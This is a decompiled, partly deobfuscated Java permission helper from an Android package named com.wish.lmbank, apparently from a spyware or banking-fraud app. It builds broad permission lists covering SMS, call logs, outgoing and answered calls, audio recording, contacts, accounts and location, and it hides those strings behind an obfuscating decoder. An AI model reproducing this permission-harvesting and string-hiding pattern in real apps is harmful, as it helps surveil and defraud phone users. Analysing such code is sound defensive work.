package com.wish.lmbank.utils;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.content.Context;
import android.media.AudioRecord;
import android.os.Build;
import android.os.PowerManager;
import android.util.Log;

import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/utils/PermissionUtils.class */
public class PermissionUtils {
    public static final int RC_ALL = 9999;
    public static final int RC_ANSWER_PHONE_CALLS = 1005;
    public static final int RC_CONTACTS = 1004;
    public static final int RC_LOCATION = 1003;
    public static final int RC_MICROPHONE = 1001;
    public static final int RC_PHONE = 1002;
    public static final int RC_STORAGE = 1000;
    private static final String TAG = "com.wish.lmbank.utils.PermissionUtils";
//     public static String[] CALENDAR = {bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzssKC02KiglLCctKDs"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRz47ID0sNiooJSwnLSg7")};
    public static String[] CALENDAR = {"android.permission.READ_CALENDAR", "android.permission.WRITE_CALENDAR"};
//     public static String[] ANSWER_PHONE_CALLS = {bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRygnOj4sOzY5ISYnLDYqKCUlOg")};
    public static String[] ANSWER_PHONE_CALLS = {"android.permission.ANSWER_PHONE_CALLS"};
//     public static String[] CAMERA = {bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRyooJCw7KA")};
    public static String[] CAMERA = {"android.permission.CAMERA"};
//     public static String[] CONTACTS = {bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzssKC02KiYnPSgqPTo"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRz47ID0sNiomJz0oKj06"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRy4sPTYoKiomPCc9Og")};
    public static String[] CONTACTS = {"android.permission.READ_CONTACTS", "android.permission.WRITE_CONTACTS", "android.permission.GET_ACCOUNTS"};
//     public static String[] LOCATION = {bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRygqKiw6OjYvICcsNiUmKig9ICYn"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRygqKiw6OjYqJig7Oiw2JSYqKD0gJic")};
    public static String[] LOCATION = {"android.permission.ACCESS_FINE_LOCATION", "android.permission.ACCESS_COARSE_LOCATION"};
//     public static String[] MICROPHONE = {bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzssKiY7LTYoPC0gJg")};
    public static String[] MICROPHONE = {"android.permission.RECORD_AUDIO"};
//     public static String[] PHONE = {bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzssKC02OSEmJyw2Oj0oPSw"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRyooJSU2OSEmJyw"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzk7JiosOjo2Jjw9LiYgJy42KiglJTo"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzssKC02KiglJTYlJi4"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRz47ID0sNiooJSU2JSYu")};
    public static String[] PHONE = {"android.permission.READ_PHONE_STATE", "android.permission.CALL_PHONE", "android.permission.PROCESS_OUTGOING_CALLS", "android.permission.READ_CALL_LOG", "android.permission.WRITE_CALL_LOG"};
//     public static String[] SENSORS = {bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRysmLTA2OiwnOiY7Og")};
    public static String[] SENSORS = {"android.permission.BODY_SENSORS"};
//     public static String[] SMS = {bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzosJy02OiQ6"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzssKiwgPyw2OiQ6"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzssKC02OiQ6"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzssKiwgPyw2Pig5Njk8OiE"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzssKiwgPyw2JCQ6")};
    public static String[] SMS = {"android.permission.SEND_SMS", "android.permission.RECEIVE_SMS", "android.permission.READ_SMS", "android.permission.RECEIVE_WAP_PUSH", "android.permission.RECEIVE_MMS"};
//     public static String[] STORAGE = {bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzssKC02LDE9LDsnKCU2Oj0mOyguLA"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRz47ID0sNiwxPSw7JyglNjo9JjsoLiw")};
    public static String[] STORAGE = {"android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE"};
//     public static String[] ALL_PERMISSION_REQUEST = {bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzssKC02OSEmJyw2JzwkKyw7Og"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRyooJCw7KA"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRygnOj4sOzY5ISYnLDYqKCUlOg"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRyslPCw9JiY9ITYqJicnLCo9"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzssKC02KiYnPSgqPTo"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRz47ID0sNiomJz0oKj06"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRy4sPTYoKiomPCc9Og"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRygqKiw6OjYvICcsNiUmKig9ICYn"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRygqKiw6OjYqJig7Oiw2JSYqKD0gJic"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzssKiY7LTYoPC0gJg"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzssKC02OSEmJyw2Oj0oPSw"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRyooJSU2OSEmJyw"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzk7JiosOjo2Jjw9LiYgJy42KiglJTo"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzssKC02KiglJTYlJi4"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRz47ID0sNiooJSU2JSYu"), "android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_SMS", "android.permission.RECEIVE_MMS", "android.permission.RECEIVE_SMS", "android.permission.RECEIVE_WAP_PUSH"};
    public static String[] ALL_PERMISSION_REQUEST = {"android.permission.READ_PHONE_NUMBERS", "android.permission.CAMERA", "android.permission.ANSWER_PHONE_CALLS", "android.permission.BLUETOOTH_CONNECT", "android.permission.READ_CONTACTS", "android.permission.WRITE_CONTACTS", "android.permission.GET_ACCOUNTS", "android.permission.ACCESS_FINE_LOCATION", "android.permission.ACCESS_COARSE_LOCATION", "android.permission.RECORD_AUDIO", "android.permission.READ_PHONE_STATE", "android.permission.CALL_PHONE", "android.permission.PROCESS_OUTGOING_CALLS", "android.permission.READ_CALL_LOG", "android.permission.WRITE_CALL_LOG", "android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_SMS", "android.permission.RECEIVE_MMS", "android.permission.RECEIVE_SMS", "android.permission.RECEIVE_WAP_PUSH"};
//     public static String[] ALL_PERMISSION_CHECK = {bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzssKC02OSEmJyw2JzwkKyw7Og"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRyooJCw7KA"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRygnOj4sOzY5ISYnLDYqKCUlOg"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzssKC02KiYnPSgqPTo"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRz47ID0sNiomJz0oKj06"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRy4sPTYoKiomPCc9Og"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRygqKiw6OjYvICcsNiUmKig9ICYn"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRygqKiw6OjYqJig7Oiw2JSYqKD0gJic"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzssKiY7LTYoPC0gJg"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzssKC02OSEmJyw2Oj0oPSw"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRyooJSU2OSEmJyw"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzk7JiosOjo2Jjw9LiYgJy42KiglJTo"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzssKC02KiglJTYlJi4"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRz47ID0sNiooJSU2JSYu"), bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzssKC02LDE9LDsnKCU2Oj0mOyguLA"), "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_SMS", "android.permission.RECEIVE_MMS", "android.permission.RECEIVE_SMS", "android.permission.RECEIVE_WAP_PUSH"};
    public static String[] ALL_PERMISSION_CHECK = {"android.permission.READ_PHONE_NUMBERS", "android.permission.CAMERA", "android.permission.ANSWER_PHONE_CALLS", "android.permission.READ_CONTACTS", "android.permission.WRITE_CONTACTS", "android.permission.GET_ACCOUNTS", "android.permission.ACCESS_FINE_LOCATION", "android.permission.ACCESS_COARSE_LOCATION", "android.permission.RECORD_AUDIO", "android.permission.READ_PHONE_STATE", "android.permission.CALL_PHONE", "android.permission.PROCESS_OUTGOING_CALLS", "android.permission.READ_CALL_LOG", "android.permission.WRITE_CALL_LOG", "android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_SMS", "android.permission.RECEIVE_MMS", "android.permission.RECEIVE_SMS", "android.permission.RECEIVE_WAP_PUSH"};

    public static boolean checkSDK() {
        return Build.VERSION.SDK_INT >= 23;
    }

    public static List<String> hasAllPermission(Context context) {
        return hasPermissions(context, ALL_PERMISSION_CHECK);
    }

    public static List<String> hasAnswerPhoneCallsPermission(Context context) {
        return hasPermissions(context, ANSWER_PHONE_CALLS);
    }

    public static List<String> hasStoragePermission(Context context) {
        return hasPermissions(context, STORAGE);
    }

    public static List<String> hasTelephonePermission(Context context) {
        return hasPermissions(context, PHONE);
    }

    public static List<String> hasMicrophonePermission(Context context) {
        return hasPermissions(context, MICROPHONE);
    }

    public static List<String> hasLocationPermission(Context context) {
        return hasPermissions(context, LOCATION);
    }

    public static List<String> hasContactsPermission(Context context) {
        return hasPermissions(context, CONTACTS);
    }

    @TargetApi(Build.VERSION_CODES.M)
    public static boolean isIgnoringBatteryOptimizations(Context context) {
//         PowerManager powerManager = (PowerManager) context.getSystemService(bb7d7pu7.m5998("GQYeDBs"));
        PowerManager powerManager = (PowerManager) context.getSystemService("power");
        return powerManager != null ? powerManager.isIgnoringBatteryOptimizations(context.getPackageName()) : false;
    }

    private static boolean hasRecordPermission() {
        byte[] bArr = new byte[640];
        AudioRecord audioRecord = null;
        try {
            @SuppressLint("MissingPermission") AudioRecord audioRecord2 = new AudioRecord(0, 8000, 16, 2, AudioRecord.getMinBufferSize(8000, 16, 2));
            try {
                audioRecord2.startRecording();
                if (audioRecord2.getRecordingState() != 3) {
                    audioRecord2.stop();
                    audioRecord2.release();
                    return false;
                } else if (audioRecord2.read(bArr, 0, 640) <= 0) {
                    audioRecord2.stop();
                    audioRecord2.release();
                    return false;
                } else {
                    audioRecord2.stop();
                    audioRecord2.release();
                    return true;
                }
            } catch (Exception e) {
                audioRecord = audioRecord2;
                if (audioRecord != null) {
                    audioRecord.release();
                    return false;
                }
                return false;
            }
        } catch (Exception e2) {
        }
        return false;
    }

    @SuppressLint("LongLogTag")
    public static List<String> hasPermissions(Context context, String... strArr) {
        ArrayList arrayList = new ArrayList();
        if (Build.VERSION.SDK_INT < 23) {
//             Log.w(TAG, bb7d7pu7.m5998("AQgaOQwbBAAaGgAGBxpTSSg5IEkfDBsaAAYHSVVJJEVJGwwdHBsHAAcOSR0bHAxJCxBJDQwPCBwFHQ"));
            Log.w(TAG, "hasPermissions: API version < M, returning true by default");
            return arrayList;
        } else if (context == null) {
//             throw new IllegalArgumentException(bb7d7pu7.m5998("KggHTh1JCgEMCgJJGQwbBAAaGgAGBxpJDwYbSQccBQVJCgYHHQwRHQ"));
            throw new IllegalArgumentException("Can't check permissions for null context");
        } else {
            for (String str : strArr) {
                if (ContextCompat.checkSelfPermission(context, str) != 0) {
                    arrayList.add(str);
                }
            }
            return arrayList;
        }
    }
}
